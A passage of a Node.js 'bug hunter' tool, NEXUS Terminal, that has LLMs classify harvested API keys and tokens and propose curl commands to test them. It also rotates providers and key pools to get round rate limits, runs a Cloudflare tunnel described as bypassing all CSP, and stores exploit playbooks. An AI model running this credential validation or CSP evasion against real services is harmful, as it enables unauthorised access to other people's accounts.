            const statusColor = p.inCooldown ? '\x1b[31m' : p.used < p.limit * 0.5 ? '\x1b[32m' : '\x1b[33m';
            const status = p.inCooldown ? `COOLDOWN ${p.cooldownRemaining}s` :
                p.healthy ? 'OK' : 'UNHEALTHY';
            console.log(`     ${p.name.padEnd(12)} [${statusColor}${bar}\x1b[0m] ${p.used}/${p.limit} RPM - ${status}`);
        });

        console.log('\n\x1b[35m═══════════════════════════════════════════════════════════════\x1b[0m\n');
    }
};

// ═══════════════════════════════════════════════════════════════════════════════════
// 📦 BATCHED ANALYZER - Combines multiple findings into single AI requests
// Reduces 19 findings x 3 calls = 57 requests → 4 batched requests!
// ═══════════════════════════════════════════════════════════════════════════════════

const BatchedAnalyzer = {
    // Process batch of findings in ONE AI request
    async processBatch(items) {
        if (!items || items.length === 0) return;

        // Group items by type
        const grouped = {};
        items.forEach(({ item, callback }) => {
            const type = item.type || 'unknown';
            if (!grouped[type]) grouped[type] = [];
            grouped[type].push({ item, callback });
        });

        // Process each group with single AI call
        for (const [type, groupItems] of Object.entries(grouped)) {
            await this.analyzeGroup(type, groupItems);
        }
    },

    // Analyze a group of similar findings in ONE request
    async analyzeGroup(type, groupItems) {
        const findings = groupItems.map(g => g.item);

        // Format all findings for batch analysis
        const findingsList = findings.map((f, i) =>
            `[${i + 1}] Value: ${(f.fullValue || f.value || '').substring(0, 60)}...
     Source: ${f.source?.type || 'unknown'} → ${f.source?.location || 'unknown'}`
        ).join('\n\n');

        const batchPrompt = `Analyze these ${findings.length} ${type} credentials in BATCH. Be efficient.

CREDENTIALS TO ANALYZE:
${findingsList}

For EACH credential, provide:
1. Exact service (Firebase, GitHub, Slack, etc.)
2. Is it a false positive? (true/false)
3. One curl command to test it
4. Bounty estimate

Respond in JSON array format:
[
  {
    "index": 1,
    "service": "service name",
    "isFalsePositive": false,
    "curlCommand": "curl -X GET ...",
    "bountyEstimate": "$100-$500",
    "impact": "brief impact"
  },
  ...
]`;

        try {
            // Use TerminalAI.query if available
            if (typeof TerminalAI !== 'undefined' && TerminalAI.query) {
                const response = await TerminalAI.query(batchPrompt, {
                    systemPrompt: 'Security expert. JSON array only.',
                    batchMode: true // Signal this is a batch request
                });

                if (response && !response.error) {
                    // Parse response and distribute to callbacks
                    try {
                        const match = response.match(/\[[\s\S]*\]/);
                        if (match) {
                            const results = JSON.parse(match[0]);

                            results.forEach((result, i) => {
                                if (groupItems[i]?.callback) {
                                    groupItems[i].callback(null, result);
                                }
                            });

                            return;
                        }
                    } catch (parseErr) {
                        // Fallback: distribute raw response
                        console.log('\x1b[33m[BatchedAnalyzer] Parse error, using raw response\x1b[0m');
                    }
                }
            }

            // Fallback: call callbacks with error
            groupItems.forEach(g => {
                if (g.callback) g.callback(new Error('Batch analysis failed'), null);
            });

        } catch (error) {
            console.log(`\x1b[31m[BatchedAnalyzer] Error: ${error.message}\x1b[0m`);
            groupItems.forEach(g => {
                if (g.callback) g.callback(error, null);
            });
        }
    },

    // Analyze findings using batch mode (called from deep analysis)
    async analyzeFindingsBatched(findings, onResult) {
        const batchSize = 5;
        const batches = [];

        // Split into batches
        for (let i = 0; i < findings.length; i += batchSize) {
            batches.push(findings.slice(i, i + batchSize));
        }

        console.log(`\x1b[36m[BatchedAnalyzer] Processing ${findings.length} findings in ${batches.length} batches\x1b[0m`);

        // Process batches with delay between them
        for (let batchIndex = 0; batchIndex < batches.length; batchIndex++) {
            const batch = batches[batchIndex];

            console.log(`\x1b[35m[Batch ${batchIndex + 1}/${batches.length}] Analyzing ${batch.length} findings...\x1b[0m`);

            const batchPrompt = this.createBatchPrompt(batch);

            try {
                // Smart provider selection
                const smartResult = await UltraRateLimitBypass.smartRequest(batchPrompt);

                if (typeof TerminalAI !== 'undefined') {
                    // Override provider if smart system suggests
                    const queryOptions = {
                        systemPrompt: 'Elite security researcher. Respond with JSON array only.',
                        batchMode: true
                    };

                    if (smartResult.useProvider) {
                        queryOptions.forceProvider = smartResult.useProvider;
                    }

                    const response = await TerminalAI.query(batchPrompt, queryOptions);

                    if (response && !response.error) {
                        // Cache the response
                        UltraRateLimitBypass.cache.set(batchPrompt, response);

                        // Parse and distribute results
                        const results = this.parseResults(response);

                        batch.forEach((finding, i) => {
                            if (results[i] && onResult) {
                                onResult(finding, results[i]);
                            }
                        });
                    }
                }

                // Delay between batches (3-5 seconds)
                if (batchIndex < batches.length - 1) {
                    const delay = 3000 + Math.random() * 2000;
                    console.log(`\x1b[2m   Waiting ${Math.round(delay / 1000)}s before next batch...\x1b[0m`);
                    await new Promise(r => setTimeout(r, delay));
                }

            } catch (error) {
                console.log(`\x1b[31m[Batch ${batchIndex + 1}] Error: ${error.message}\x1b[0m`);

                // Wait longer on error
                if (batchIndex < batches.length - 1) {
                    await new Promise(r => setTimeout(r, 10000));
                }
            }
        }
    },

    // Create efficient batch prompt
    createBatchPrompt(findings) {
        const findingsList = findings.map((f, i) => {
            const value = (f.fullValue || f.value || '').substring(0, 80);
            const source = f.source?.type || f.sourceDetails?.type || 'unknown';
            return `[${i + 1}] TYPE: ${f.type}
    VALUE: ${value}
    SOURCE: ${source}`;
        }).join('\n\n');

        return `BATCH SECURITY ANALYSIS - Analyze ALL ${findings.length} credentials below.

${findingsList}

For EACH credential numbered [1] to [${findings.length}], provide:
- service: exact service name (Firebase, OpenAI, GitHub, Slack, AWS, Stripe, etc.)
- isFalsePositive: true if it's not a real credential, false if real
- curlCommand: ONE curl command to validate this credential
- bountyEstimate: dollar range like "$500-$2000"
- impact: one sentence impact description

RESPOND WITH ONLY A JSON ARRAY - NO OTHER TEXT:
[{"index":1,"service":"...","isFalsePositive":false,"curlCommand":"curl...","bountyEstimate":"$X-$Y","impact":"..."},...]`;
    },

    // Parse batch results from AI response
    parseResults(response) {
        try {
            // Find JSON array in response
            const match = response.match(/\[[\s\S]*?\]/);
            if (match) {
                return JSON.parse(match[0]);
            }
        } catch (e) {
            console.log('\x1b[33m[BatchedAnalyzer] Failed to parse JSON, extracting manually\x1b[0m');
        }

        // Fallback: try to extract individual results
        const results = [];
        const pattern = /\[(\d+)\][\s\S]*?service[:\s"]+([^",\n]+)[\s\S]*?curlCommand[:\s"]+([^"]+)/gi;
        let match;

        while ((match = pattern.exec(response)) !== null) {
            results.push({
                index: parseInt(match[1]),
                service: match[2].trim(),
                curlCommand: match[3].trim(),
                isFalsePositive: response.toLowerCase().includes('false positive')
            });
        }

        return results;
    }
};

// Initialize on load
UltraRateLimitBypass.init();

// ══════════════════════════════════════════════════════════════════════════════
// CONFIGURATION
// ══════════════════════════════════════════════════════════════════════════════

const CONFIG = {
    PORT: process.env.PORT || 9999,
    AUTH_TOKEN: process.env.NEXUS_TOKEN || generateToken(),
    AI_KEY: process.env.AI_KEY || null,
    AI_PROVIDER: process.env.AI_PROVIDER || 'gemini',
    MAX_CONCURRENT: 10,
    COMMAND_TIMEOUT: 60000,
    LOG_FILE: './nexus-terminal.log',
    BG_LOG_FILE: './nexus-background.log',    // Background logs (AI, retries, etc.)
    LOG_VIEWER_FILE: './nexus-logs.html',     // HTML log viewer
    DATA_FILE: './nexus-data.json',
    AI_COLLAB_LOG: './nexus-ai-collab.json',
    VERSION: '5.0.0',
    AUTO_SYNC: true,
    AUTO_AI_ANALYZE: true,
    AI_COLLAB_MODE: true,   // Both AIs talk to each other
    SYNC_INTERVAL: 30000,   // Re-sync every 30s
    AI_DEEP_ANALYSIS: true, // Deep analysis on findings
    QUIET_MODE: false,      // When true, background logs go to file only

    // Cloudflare Tunnel Config
    USE_CLOUDFLARE: true,           // Auto-start cloudflared tunnel
    CLOUDFLARE_URL: null,           // Will be set when tunnel starts
    CLOUDFLARE_RETRY: 3,            // Retry attempts
    NO_CLOUDFLARE: false,           // Disable cloudflare (--no-cloudflare flag)
    CLOUDFLARED_PATH: null          // Will be set by AutoHealer
};

// Parse command line args
process.argv.forEach((arg, i) => {
    if (arg === '--ai-key' && process.argv[i + 1]) {
        CONFIG.AI_KEY = process.argv[i + 1];
    }
    if (arg === '--port' && process.argv[i + 1]) {
        CONFIG.PORT = parseInt(process.argv[i + 1]);
    }
    if (arg === '--provider' && process.argv[i + 1]) {
        CONFIG.AI_PROVIDER = process.argv[i + 1];
    }
    if (arg === '--no-cloudflare' || arg === '--no-tunnel') {
        CONFIG.NO_CLOUDFLARE = true;
        CONFIG.USE_CLOUDFLARE = false;
    }
});

// ══════════════════════════════════════════════════════════════════════════════
// CLOUDFLARE TUNNEL - AUTO CSP BYPASS
// ══════════════════════════════════════════════════════════════════════════════

const CloudflareTunnel = {
    process: null,
    url: null,
    isRunning: false,
    retryCount: 0,
    cloudflaredPath: 'cloudflared',

    // Check if cloudflared is installed
    async isInstalled() {
        return new Promise((resolve) => {
            exec('which cloudflared || where cloudflared', (error, stdout) => {
                resolve(!error && stdout.trim().length > 0);
            });
        });
    },

    // Start cloudflared tunnel
    async start(port, cloudflaredPath = null) {
        if (CONFIG.NO_CLOUDFLARE) {
            log('Cloudflare Tunnel disabled (--no-cloudflare flag)', 'yellow');
            return null;
        }

        // Use provided path or default
        this.cloudflaredPath = cloudflaredPath || 'cloudflared';

        log('🌐 Starting Cloudflare Tunnel...', 'cyan');

        return new Promise((resolve) => {
            try {
                this.process = spawn(this.cloudflaredPath, ['tunnel', '--url', `http://localhost:${port}`], {
                    stdio: ['ignore', 'pipe', 'pipe']
                });

                let urlFound = false;
                const urlRegex = /https:\/\/[a-z0-9-]+\.trycloudflare\.com/i;

                const handleOutput = (data) => {
                    const output = data.toString();
                    const match = output.match(urlRegex);

                    if (match && !urlFound) {
                        urlFound = true;
                        this.url = match[0];
                        this.isRunning = true;
                        CONFIG.CLOUDFLARE_URL = this.url;

                        const wssUrl = this.url.replace('https://', 'wss://');

                        console.log(`
${C.green}${C.bold}╔══════════════════════════════════════════════════════════════════════════════╗
║                    ☁️  CLOUDFLARE TUNNEL ACTIVE (CSP BYPASS!)                 ║
╠══════════════════════════════════════════════════════════════════════════════╣
║                                                                              ║
║  ${C.cyan}HTTPS URL: ${this.url}${C.green}
║  ${C.yellow}WSS URL:   ${wssUrl}${C.green}
║                                                                              ║
║  ${C.white}Copy this to browser console:${C.green}                                            ║
║  ${C.cyan}connectTerminal("${wssUrl}", "${CONFIG.AUTH_TOKEN}")${C.green}
║                                                                              ║
║  ${C.dim}✅ This bypasses ALL CSP restrictions!${C.green}                                    ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝${C.reset}
`);
                        log(`Cloudflare Tunnel ready: ${this.url}`, 'green');
                        resolve(this.url);
                    }
                };

                this.process.stdout.on('data', handleOutput);
                this.process.stderr.on('data', handleOutput);

                this.process.on('error', (err) => {
                    log(`Cloudflare Tunnel error: ${err.message}`, 'red');
                    this.isRunning = false;
                    resolve(null);
                });

                this.process.on('close', (code) => {
                    if (this.isRunning) {
                        log(`Cloudflare Tunnel closed (code: ${code})`, 'yellow');
                    }
                    this.isRunning = false;

                    // Auto-restart if unexpectedly closed
                    if (code !== 0 && this.retryCount < CONFIG.CLOUDFLARE_RETRY) {
                        this.retryCount++;
                        log(`Restarting Cloudflare Tunnel (attempt ${this.retryCount}/${CONFIG.CLOUDFLARE_RETRY})...`, 'yellow');
                        setTimeout(() => this.start(port, this.cloudflaredPath), 3000);
                    }
                });

                // Timeout - if URL not found in 30 seconds
                setTimeout(() => {
                    if (!urlFound) {
                        log('Cloudflare Tunnel timeout - URL not received', 'yellow');
                        resolve(null);
                    }
                }, 30000);

            } catch (err) {
                log(`Failed to start Cloudflare Tunnel: ${err.message}`, 'red');
                resolve(null);
            }
        });
    },

    // Stop tunnel
    stop() {
        if (this.process) {
            this.process.kill();
            this.process = null;
            this.isRunning = false;
            this.url = null;
            CONFIG.CLOUDFLARE_URL = null;
            log('Cloudflare Tunnel stopped', 'yellow');
        }
    },

    // Get connection command for browser
    getConnectCommand() {
        if (!this.url) return null;
        const wssUrl = this.url.replace('https://', 'wss://');
        return `connectTerminal("${wssUrl}", "${CONFIG.AUTH_TOKEN}")`;
    }
};

// ══════════════════════════════════════════════════════════════════════════════
// COLORS & UTILITIES
// ══════════════════════════════════════════════════════════════════════════════

const C = {
    reset: '\x1b[0m',
    bold: '\x1b[1m',
    dim: '\x1b[2m',
    gray: '\x1b[90m',      // Added: Bright black (gray)
    grey: '\x1b[90m',      // Alias for gray
    red: '\x1b[31m',
    green: '\x1b[32m',
    yellow: '\x1b[33m',
    blue: '\x1b[34m',
    magenta: '\x1b[35m',
    cyan: '\x1b[36m',
    white: '\x1b[37m',
    bgRed: '\x1b[41m',
    bgGreen: '\x1b[42m',
    bgYellow: '\x1b[43m',
    bgBlue: '\x1b[44m',
    bgMagenta: '\x1b[45m'
};

function generateToken() {
    return Math.random().toString(36).substring(2, 10) +
        Math.random().toString(36).substring(2, 10);
}

function timestamp() {
    return new Date().toISOString().split('T')[1].split('.')[0];
}

// ══════════════════════════════════════════════════════════════════════════════
// BACKGROUND LOGGER SYSTEM - Keeps terminal clean for user input
// ══════════════════════════════════════════════════════════════════════════════

const BackgroundLogger = {
    logs: [],
    maxLogs: 1000,
    viewerOpen: false,
    lastViewerUpdate: 0,
    viewerUpdateInterval: 500,

    // Patterns that indicate background activity (not user-initiated)
    bgPatterns: [
        /^⏳ Smart (delay|throttle)/,
        /^🔄 Calling api\./,
        /^❌ Auth error/,
        /^⚠️ AI error/,
        /^🧠 \[Cycle \d+/,
        /^⏳ Rate limited/,
        /^🔑 (Rotated|Switched|Auth)/,
        /^📥 Browser data/,
        /^🆓 (Trying|Last resort)/,
        /^⏳ Will retry/,
        /^✅ (Got response|HuggingFace)/,
        /^⏳ Smart throttle/,
        /^⏳ Near rate limit/,
        /^⏳ HuggingFace/,
        /^⏳ Backoff/,
        /Switching provider/,
        /thinking\.\.\./i,
        /retry.*\d+\/\d+/i,
        /No backup providers/,
        /cooldown/i,
        /^🔄 Trying FREE/,
        /^🔄 Switching/,
        /GROQ (rate limited|protection)/i,
        /^   \d+\./,  // Numbered tips like "1. addkey..."
        /addkey groq/,
        /bulkkeys groq/,
        /keypool/
    ],

    // Check if message is background activity
    isBackground(msg) {
        if (!CONFIG.QUIET_MODE) return false;
        return this.bgPatterns.some(pattern => pattern.test(msg));
    },

    // Add log entry
    add(msg, color, ts) {
        this.logs.push({
            time: ts,
            msg: msg,
            color: color,
            timestamp: Date.now()
        });

        // Trim old logs
        if (this.logs.length > this.maxLogs) {
            this.logs = this.logs.slice(-this.maxLogs);
        }

        // Write to background log file
        try {
            fs.appendFileSync(CONFIG.BG_LOG_FILE, `[${ts}] ${msg}\n`);
        } catch (e) { }

        // Update HTML viewer if open
        this.updateViewer();
    },

    // Generate Professional HTML log viewer for Bug Hunters
    generateViewer() {
        // Categorize logs
        const errorLogs = this.logs.filter(l => l.color === 'red' || l.msg?.includes('❌') || l.msg?.includes('Error'));
        const warningLogs = this.logs.filter(l => l.color === 'yellow' || l.msg?.includes('⚠️') || l.msg?.includes('Rate'));
        const successLogs = this.logs.filter(l => l.color === 'green' || l.msg?.includes('✅'));
        const aiLogs = this.logs.filter(l => l.msg?.includes('AI') || l.msg?.includes('🧠') || l.msg?.includes('🤖'));

        const logsHtml = this.logs.slice(-300).map(l => {
            const colorMap = {
                red: '#ff6b6b', green: '#51cf66', yellow: '#fcc419',
                blue: '#339af0', cyan: '#22b8cf', magenta: '#cc5de8',
                white: '#f8f9fa', dim: '#868e96', gray: '#868e96'
            };
            const htmlColor = colorMap[l.color] || '#f8f9fa';
            const escapedMsg = (l.msg || '').replace(/</g, '&lt;').replace(/>/g, '&gt;');

            // Determine log type for filtering
            let logType = 'info';
            if (l.color === 'red' || l.msg?.includes('❌')) logType = 'error';
            else if (l.color === 'yellow' || l.msg?.includes('⚠️')) logType = 'warning';
            else if (l.color === 'green' || l.msg?.includes('✅')) logType = 'success';
            else if (l.msg?.includes('AI') || l.msg?.includes('🧠')) logType = 'ai';

            return '<div class="log-entry ' + logType + '" style="color:' + htmlColor + '" data-type="' + logType + '"><span class="time">[' + l.time + ']</span> ' + escapedMsg + '</div>';
        }).join('\n');

        // Get AI status safely
        let aiStatus = { available: false, paused: false, consecutiveFailures: 0, pauseRemaining: 0 };
        try {
            if (typeof TerminalAI !== 'undefined' && TerminalAI.aiAvailability) {
                aiStatus = TerminalAI.aiAvailability.status();
            }
        } catch (e) { }

        const aiDotClass = aiStatus.available ? 'online' : (aiStatus.paused ? 'paused' : 'offline');
        const aiStatusText = aiStatus.available ? 'Online & Ready' : (aiStatus.paused ? 'Paused (' + aiStatus.pauseRemaining + 's)' : 'Offline');

        return '<!DOCTYPE html><html><head><title>NEXUS Pro Dashboard</title><meta http-equiv="refresh" content="2"><style>' +
            '* { margin: 0; padding: 0; box-sizing: border-box; }' +
            'body { background: #0d1117; color: #c9d1d9; font-family: Consolas, monospace; font-size: 12px; }' +
            '.dashboard { display: grid; grid-template-columns: 260px 1fr; height: 100vh; }' +
            '.sidebar { background: #161b22; border-right: 1px solid #30363d; padding: 15px; overflow-y: auto; }' +
            '.logo { text-align: center; padding: 15px 0; border-bottom: 1px solid #30363d; margin-bottom: 15px; }' +
            '.logo h1 { font-size: 18px; color: #58a6ff; }' +
            '.stats-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin-bottom: 15px; }' +
            '.stat-card { background: #21262d; border: 1px solid #30363d; border-radius: 6px; padding: 10px; text-align: center; }' +
            '.stat-card .number { font-size: 20px; font-weight: bold; }' +
            '.stat-card .label { font-size: 9px; color: #8b949e; }' +
            '.stat-card.error .number { color: #f85149; }' +
            '.stat-card.warning .number { color: #d29922; }' +
            '.stat-card.success .number { color: #3fb950; }' +
            '.stat-card.ai .number { color: #a371f7; }' +
            '.ai-status { background: #21262d; border: 1px solid #30363d; border-radius: 6px; padding: 12px; margin-bottom: 15px; }' +
            '.ai-dot { width: 8px; height: 8px; border-radius: 50%; display: inline-block; margin-right: 8px; }' +
            '.ai-dot.online { background: #3fb950; }' +
            '.ai-dot.paused { background: #d29922; }' +
            '.ai-dot.offline { background: #f85149; }' +
            '.filter-btn { display: block; width: 100%; padding: 8px; margin-bottom: 4px; background: #21262d; border: 1px solid #30363d; border-radius: 4px; color: #c9d1d9; font-size: 11px; cursor: pointer; text-align: left; }' +
            '.filter-btn:hover { background: #30363d; }' +
            '.filter-btn.active { border-color: #58a6ff; }' +
            '.filter-btn .count { float: right; color: #8b949e; }' +
            '.main-content { display: flex; flex-direction: column; height: 100vh; }' +
            '.header-bar { background: #161b22; border-bottom: 1px solid #30363d; padding: 10px 15px; display: flex; justify-content: space-between; }' +
            '.logs-container { flex: 1; overflow-y: auto; padding: 10px; }' +
            '.log-entry { padding: 5px 8px; margin-bottom: 2px; border-radius: 3px; font-size: 11px; }' +
            '.log-entry:hover { background: #161b22; }' +
            '.log-entry.hidden { display: none; }' +
            '.log-entry .time { color: #484f58; margin-right: 6px; }' +
            '.log-entry.error { border-left: 3px solid #f85149; background: #f8514915; }' +
            '.log-entry.warning { border-left: 3px solid #d29922; background: #d2992215; }' +
            '.log-entry.success { border-left: 3px solid #3fb950; background: #3fb95015; }' +
            '.log-entry.ai { border-left: 3px solid #a371f7; background: #a371f715; }' +
            '::-webkit-scrollbar { width: 6px; }' +
            '::-webkit-scrollbar-track { background: #0d1117; }' +
            '::-webkit-scrollbar-thumb { background: #30363d; border-radius: 3px; }' +
            '</style></head><body><div class="dashboard"><div class="sidebar">' +
            '<div class="logo"><h1>🔥 NEXUS PRO</h1><div style="font-size:10px;color:#8b949e;">Bug Hunter Dashboard</div></div>' +
            '<div class="stats-grid">' +
            '<div class="stat-card error"><div class="number">' + errorLogs.length + '</div><div class="label">Errors</div></div>' +
            '<div class="stat-card warning"><div class="number">' + warningLogs.length + '</div><div class="label">Warnings</div></div>' +
            '<div class="stat-card success"><div class="number">' + successLogs.length + '</div><div class="label">Success</div></div>' +
            '<div class="stat-card ai"><div class="number">' + aiLogs.length + '</div><div class="label">AI Ops</div></div>' +
            '</div>' +
            '<div class="ai-status"><div style="font-size:11px;color:#8b949e;margin-bottom:8px;">🤖 AI STATUS</div>' +
            '<div><span class="ai-dot ' + aiDotClass + '"></span>' + aiStatusText + '</div>' +
            '<div style="font-size:10px;color:#8b949e;margin-top:5px;">Failures: ' + aiStatus.consecutiveFailures + '/5</div></div>' +
            '<div style="margin-bottom:10px;font-size:10px;color:#8b949e;">FILTERS</div>' +
            '<button class="filter-btn active" onclick="filterLogs(\'all\')">All <span class="count">' + this.logs.length + '</span></button>' +
            '<button class="filter-btn" onclick="filterLogs(\'error\')">❌ Errors <span class="count">' + errorLogs.length + '</span></button>' +
            '<button class="filter-btn" onclick="filterLogs(\'warning\')">⚠️ Warnings <span class="count">' + warningLogs.length + '</span></button>' +
            '<button class="filter-btn" onclick="filterLogs(\'success\')">✅ Success <span class="count">' + successLogs.length + '</span></button>' +
            '<button class="filter-btn" onclick="filterLogs(\'ai\')">🧠 AI <span class="count">' + aiLogs.length + '</span></button>' +
            '<div style="margin-top:15px;padding-top:10px;border-top:1px solid #30363d;font-size:9px;color:#484f58;">' +
            '💡 quiet mode ON | ai-reset to clear</div>' +
            '</div><div class="main-content">' +
            '<div class="header-bar"><div style="font-weight:600;">📋 Activity Stream</div><div style="font-size:10px;color:#8b949e;">' + new Date().toLocaleTimeString() + '</div></div>' +
            '<div class="logs-container" id="logs">' + (logsHtml || '<div style="text-align:center;padding:40px;color:#484f58;">No activity yet</div>') + '</div>' +
            '</div></div>' +
            '<script>document.getElementById("logs").scrollTop=document.getElementById("logs").scrollHeight;' +
            'function filterLogs(t){document.querySelectorAll(".filter-btn").forEach(b=>b.classList.remove("active"));' +
            'event.target.classList.add("active");document.querySelectorAll(".log-entry").forEach(e=>{' +
            'e.classList.toggle("hidden",t!=="all"&&e.dataset.type!==t);});}</script></body></html>';
    },

    // Update HTML viewer file
    updateViewer() {
        const now = Date.now();
        if (now - this.lastViewerUpdate < this.viewerUpdateInterval) return;
        this.lastViewerUpdate = now;

        try {
            fs.writeFileSync(CONFIG.LOG_VIEWER_FILE, this.generateViewer());
        } catch (e) { }
    },

    // Open log viewer in browser
    openViewer() {
        // Generate initial HTML
        fs.writeFileSync(CONFIG.LOG_VIEWER_FILE, this.generateViewer());

        const viewerPath = path.resolve(CONFIG.LOG_VIEWER_FILE);

        // Open in default browser
        const opener = process.platform === 'win32' ? 'start' :
            process.platform === 'darwin' ? 'open' : 'xdg-open';

        exec(`${opener} "${viewerPath}"`, (err) => {
            if (err) {
                log(`📄 Log viewer: file://${viewerPath}`, 'cyan');
            } else {
                log('🔔 Opened background log viewer in browser!', 'green');
            }
        });

        this.viewerOpen = true;
    },

    // Get recent logs
    getRecent(count = 20) {
        return this.logs.slice(-count);
    },

    // Clear logs
    clear() {
        this.logs = [];
        try {
            fs.writeFileSync(CONFIG.BG_LOG_FILE, '');
            this.updateViewer();
        } catch (e) { }
    }
};

// Smart log function - routes background logs separately when QUIET_MODE is on
function log(msg, color = 'white') {
    const ts = timestamp();
    const colorCode = C[color] || C.white;

    // Check if this is a background log
    if (BackgroundLogger.isBackground(msg)) {
        // Only log to background file, not terminal
        BackgroundLogger.add(msg, color, ts);
        return;
    }

    // Regular log - show in terminal
    console.log(`${colorCode}[${ts}] ${msg}${C.reset}`);

    // Also write to main log file
    try {
        fs.appendFileSync(CONFIG.LOG_FILE, `[${ts}] ${msg}\n`);
    } catch (e) { }
}

function logBox(title, content, color = 'cyan') {
    const width = 70;
    const line = '═'.repeat(width);
    console.log(`${C[color]}╔${line}╗${C.reset}`);
    console.log(`${C[color]}║${C.bold} ${title.padEnd(width - 1)}${C[color]}║${C.reset}`);
    console.log(`${C[color]}╠${line}╣${C.reset}`);
    if (Array.isArray(content)) {
        content.forEach(l => {
            console.log(`${C[color]}║${C.reset} ${l.padEnd(width - 1)}${C[color]}║${C.reset}`);
        });
    } else {
        console.log(`${C[color]}║${C.reset} ${content.padEnd(width - 1)}${C[color]}║${C.reset}`);
    }
    console.log(`${C[color]}╚${line}╝${C.reset}`);
}

// ══════════════════════════════════════════════════════════════════════════════
// AI ENGINE - TERMINAL SIDE (ADVANCED v5.0 - MULTI-PROVIDER + COLLABORATION)
// ══════════════════════════════════════════════════════════════════════════════

// Professional System Prompts for AI Training - CONTROLLED MODE
const AI_SYSTEM_PROMPTS = {
    // Main security analysis prompt - SIMPLE AND CLEAR
    security_analyst: `You are NEXUS AI - an expert security analyst for bug bounty hunting.

YOUR JOB: Analyze findings and identify services/credentials accurately.

COMMON PATTERNS:
- AIza* = Google/Firebase API Key
- gsk_* = Groq API Key  
- sk-* (50+ chars) = OpenAI API Key
- sk_live_*/sk_test_* = Stripe Key
- xoxb-*/xoxp-* = Slack Token
- ghp_*/gho_* = GitHub Token
- AKIA* = AWS Access Key
- SG.* = SendGrid Key
- [0-9]+:AA* = Telegram Bot Token

FOR EACH FINDING:
1. Identify the EXACT service (Firebase, GitHub, Stripe, etc.)
2. Is it likely LIVE or DEAD? (based on format/context)
3. Estimate bounty range ($100-$500, $500-$2000, etc.)
4. Give ONE curl command to test it

RESPOND IN JSON ONLY:
{
  "service": "exact_service_name",
  "isLive": true/false,
  "bountyEstimate": "$X-$Y",
  "curlCommand": "curl -s ...",
  "reasoning": "brief explanation"
}`,

    // Vulnerability analysis prompt
    vuln_analyzer: `You are a security expert. Analyze this credential and respond in JSON:
{
  "service": "service_name",
  "keyType": "api_key|token|secret",
  "likelyValid": true/false,
  "risk": "CRITICAL|HIGH|MEDIUM|LOW",
  "testCommand": "curl command to validate",
  "impact": "what can be done with access"
}`,

    // Exploit planner prompt
    exploit_planner: `You are a bug bounty expert. For this finding, provide JSON:
{
  "service": "identified_service",
  "attackVectors": ["possible", "attack", "methods"],
  "testCommands": ["curl commands to test"],
  "bountyEstimate": "$X-$Y",
  "reportTemplate": "brief report summary"
}`,

    // Collaboration prompt
    collaborator: `You are NEXUS Terminal AI. Analyze browser findings and suggest actions.
Respond in JSON with analysis results and recommended next steps.`
};

// ══════════════════════════════════════════════════════════════════════════════
// AI PERSISTENT MEMORY SYSTEM - Survives API Key Changes
// ══════════════════════════════════════════════════════════════════════════════

const AI_MEMORY_FILE = './nexus-ai-memory.json';
const AI_TRAINING_FILE = './nexus-ai-training.json';

const AIMemory = {
    // Persistent data - survives API key changes
    data: {
        learnedPatterns: [],          // Patterns AI has learned to recognize
        tokenDatabase: {},            // All tokens ever analyzed with results
        exploitPlaybooks: {},         // Successful exploitation patterns
        serviceSignatures: {},        // Service identification patterns
        falsePositives: [],           // Known false positives to skip
        successfulExploits: [],       // History of working exploits
        bountyEstimates: {},          // Service -> bounty estimates
        vendorResponses: {},          // How vendors typically respond
        aiConversations: [],          // AI-to-AI conversation history
        totalTokensAnalyzed: 0,
        totalExploitsFound: 0,
        lastUpdated: null,
        version: '1.0'
    },

    // Load from disk
    load() {
        try {
            if (fs.existsSync(AI_MEMORY_FILE)) {
                const saved = JSON.parse(fs.readFileSync(AI_MEMORY_FILE, 'utf8'));
                this.data = { ...this.data, ...saved };
                log(`📚 AI Memory loaded: ${this.data.totalTokensAnalyzed} tokens, ${this.data.totalExploitsFound} exploits`, 'green');
                return true;
            }
        } catch (e) {
            log(`⚠️ Could not load AI memory: ${e.message}`, 'yellow');
        }
        return false;
    },

    // Save to disk
    save() {
        try {
            this.data.lastUpdated = new Date().toISOString();
            fs.writeFileSync(AI_MEMORY_FILE, JSON.stringify(this.data, null, 2));
            return true;
        } catch (e) {
            log(`⚠️ Could not save AI memory: ${e.message}`, 'yellow');
            return false;
        }
    },

    // Learn from a token analysis
    learnFromToken(token, type, analysis, exploitResult) {
        const hash = this.hashToken(token);

        this.data.tokenDatabase[hash] = {
            type,
            prefix: token.substring(0, 10),
            length: token.length,
            analysis,
            exploitResult,
            analyzedAt: new Date().toISOString()
        };

        this.data.totalTokensAnalyzed++;

        // Learn pattern if exploit was successful
        if (exploitResult?.success) {
            this.data.totalExploitsFound++;

            // Extract service signature
            const service = analysis?.service || type;
            if (!this.data.serviceSignatures[service]) {
                this.data.serviceSignatures[service] = {
                    patterns: [],
                    avgLength: 0,
                    prefixes: [],
                    exploitCommands: []
                };
            }

            const sig = this.data.serviceSignatures[service];
            sig.patterns.push(type);
            sig.prefixes.push(token.substring(0, 10));
            sig.avgLength = ((sig.avgLength * (sig.prefixes.length - 1)) + token.length) / sig.prefixes.length;

            if (exploitResult.command) {
                sig.exploitCommands.push(exploitResult.command);
            }

            // Save successful exploit playbook
            this.data.successfulExploits.push({
                type,
                service,
                tokenPrefix: token.substring(0, 10),
                command: exploitResult.command,
                result: exploitResult.output?.substring(0, 500),
                timestamp: new Date().toISOString()
            });
        }

        // Auto-save periodically
        if (this.data.totalTokensAnalyzed % 10 === 0) {
            this.save();
        }
    },

    // Record AI-to-AI conversation
    recordConversation(from, to, message, response) {
        this.data.aiConversations.push({
            from,
            to,
            message: typeof message === 'string' ? message.substring(0, 1000) : JSON.stringify(message).substring(0, 1000),
            response: typeof response === 'string' ? response.substring(0, 1000) : JSON.stringify(response).substring(0, 1000),
            timestamp: new Date().toISOString()
        });

        // Keep only last 500 conversations
        if (this.data.aiConversations.length > 500) {
            this.data.aiConversations = this.data.aiConversations.slice(-500);
        }
    },

    // Get similar tokens from memory
    findSimilarTokens(token) {
        const prefix = token.substring(0, 10);
        const similar = [];

        for (const [hash, data] of Object.entries(this.data.tokenDatabase)) {
            if (data.prefix === prefix ||
                data.type === this.guessType(token) ||
                Math.abs(data.length - token.length) < 5) {
                similar.push(data);
            }
        }

        return similar;
    },

    // Get exploitation recommendations based on learned data
    getExploitRecommendations(type) {
        const recommendations = [];

        // Check service signatures
        for (const [service, sig] of Object.entries(this.data.serviceSignatures)) {
